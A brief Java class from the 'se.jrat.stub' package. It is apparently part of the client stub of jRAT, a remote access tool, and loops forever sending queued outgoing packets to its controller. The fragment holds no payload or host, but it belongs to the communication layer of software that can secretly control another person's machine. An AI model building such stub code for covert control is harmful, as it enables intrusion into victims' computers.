package se.jrat.stub;

import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;

public class PacketThread extends Thread {

	public static PacketHandler c = new PacketHandler();
	
	@Override
	public void run() {
		while (true) {
			AbstractOutgoingPacket packet = c.nextResult();
			System.out.println(packet.getClass().getSimpleName());

			AbstractOutgoingPacket.send(packet);
		}
	}
}
